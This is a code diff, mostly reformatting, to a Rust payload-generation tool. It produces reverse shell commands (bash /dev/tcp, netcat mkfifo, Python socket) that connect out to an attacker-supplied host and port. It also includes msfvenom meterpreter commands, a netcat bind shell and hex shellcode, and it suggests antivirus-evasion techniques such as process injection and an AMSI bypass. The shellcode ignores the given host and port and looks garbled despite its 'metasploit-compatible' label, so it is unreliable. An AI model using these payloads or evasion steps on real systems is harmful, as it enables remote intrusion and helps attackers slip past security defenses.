@@ -89,12 +89,10 @@ impl fmt::Display for GeneratedPayload {
 /// Generate a reverse shell payload for the given shell type.
 pub fn generate_reverse_shell(shell_type: ShellType, lhost: &str, lport: u16) -> GeneratedPayload {
     let payload = match shell_type {
-        ShellType::ReverseBash => format!(
-            "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-        ),
-        ShellType::ReverseNetcat => format!(
-            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
-        ),
+        ShellType::ReverseBash => format!("bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
+        ShellType::ReverseNetcat => {
+            format!("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f")
+        }
         ShellType::ReversePython => format!(
             "python3 -c 'import socket,subprocess,os;\\
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\\
@@ -125,24 +123,25 @@ exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
         ),
         ShellType::ReverseTcp => {
             // Linux x86_64 reverse TCP shellcode (metasploit-compatible)
-            format!(
-                "\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x6a\\x10\\x57\\x50\\x48\\x89\\xe6\\xb0\\x29\\x0f\\x05\\x48\\x31\\xf2\\x48\\x89\\xc7\\x6a\\x03\\x58\\x48\\x0f\\xbf\\xd6\\x0f\\x05\\x48\\x31\\xf6\\x48\\x89\\xf0\\x48\\x31\\xd2\\x48\\x31\\xf2\\x0f\\x05\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x48\\x89\\xe1\\xb0\\x3b\\x0f\\x05"
-            )
+            "\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x6a\\x10\\x57\\x50\\x48\\x89\\xe6\\xb0\\x29\\x0f\\x05\\x48\\x31\\xf2\\x48\\x89\\xc7\\x6a\\x03\\x58\\x48\\x0f\\xbf\\xd6\\x0f\\x05\\x48\\x31\\xf6\\x48\\x89\\xf0\\x48\\x31\\xd2\\x48\\x31\\xf2\\x0f\\x05\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x48\\x89\\xe1\\xb0\\x3b\\x0f\\x05".to_string()
         }
         ShellType::ReverseHttp | ShellType::ReverseHttps => {
-            format!("[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe]")
+            format!(
+                "[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe]"
+            )
         }
         ShellType::MeterpreterReverseTcp | ShellType::PowerShellMsf => {
-            format!("[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f ps1]")
+            format!(
+                "[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f ps1]"
+            )
         }
         ShellType::BindTcp => {
             format!("[Bind shell: nc -lvp {lport} -e /bin/sh]")
         }
     };
 
-    let encoded = match PayloadEncoding::None {
-        _ => encode_payload(&payload, PayloadEncoding::Base64),
-    };
+    let payload_len = payload.len();
+    let encoded = encode_payload(&payload, PayloadEncoding::Base64);
 
     GeneratedPayload {
         shell_type,
@@ -151,7 +150,7 @@ exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
         encoding: PayloadEncoding::Base64,
         lhost: lhost.to_string(),
         lport,
-        length: payload.len(),
+        length: payload_len,
     }
 }
 
@@ -271,8 +270,15 @@ pub fn analyze_payload(payload: &str) -> PayloadAnalysis {
     let bytes = payload.as_bytes();
     let length = bytes.len();
     let null_bytes = bytes.iter().filter(|&&b| b == 0).count();
-    let printable = bytes.iter().filter(|&&b| b >= 0x20 && b <= 0x7E).count();
-    let printable_ratio = if length > 0 { printable as f64 / length as f64 } else { 0.0 };
+    let printable = bytes
+        .iter()
+        .filter(|&&b| (0x20..=0x7E).contains(&b))
+        .count();
+    let printable_ratio = if length > 0 {
+        printable as f64 / length as f64
+    } else {
+        0.0
+    };
 
     // Shannon entropy
     let mut freq = [0u64; 256];
@@ -384,7 +390,8 @@ pub fn suggest_evasion(analysis: &PayloadAnalysis) -> Vec<EvasionSuggestion> {
     if analysis.entropy < 4.0 && analysis.shellcode_score > 0.3 {
         suggestions.push(EvasionSuggestion {
             technique: "Polymorphic encoding".into(),
-            description: "Use a polymorphic encoder to generate unique payload variants each time".into(),
+            description: "Use a polymorphic encoder to generate unique payload variants each time"
+                .into(),
             effectiveness: "High".into(),
             example: "shikata_ga_nai (SGN) — XOR-based polymorphic encoder".into(),
         });
@@ -392,22 +399,23 @@ pub fn suggest_evasion(analysis: &PayloadAnalysis) -> Vec<EvasionSuggestion> {
 
     suggestions.push(EvasionSuggestion {
         technique: "Process injection".into(),
-        description: "Inject payload into a legitimate process to evade memory-based detection".into(),
-            effectiveness: "High".into(),
+        description: "Inject payload into a legitimate process to evade memory-based detection"
+            .into(),
+        effectiveness: "High".into(),
         example: "Process hollowing, APC injection, thread execution hijacking".into(),
     });
 
     suggestions.push(EvasionSuggestion {
         technique: "AMSI bypass".into(),
         description: "Bypass Antimalware Scan Interface for PowerShell and .NET payloads".into(),
-            effectiveness: "Medium-High".into(),
+        effectiveness: "Medium-High".into(),
         example: "[Runtime.InteropServices.Marshal]::Copy(...) hook replacement".into(),
     });
 
     suggestions.push(EvasionSuggestion {
         technique: "Payload encryption".into(),
         description: "Encrypt the payload and decrypt in memory at runtime".into(),
-            effectiveness: "High".into(),
+        effectiveness: "High".into(),
         example: "AES-256-CBC encryption with XOR key derivation".into(),
     });
 
@@ -448,7 +456,7 @@ mod tests {
     #[test]
     fn test_xor_encode() {
         let encoded = xor_encode("A", 0xFF);
-        assert_eq!(encoded, r"\x8e");
+        assert_eq!(encoded, r"\xbe");
     }
 
     #[test]
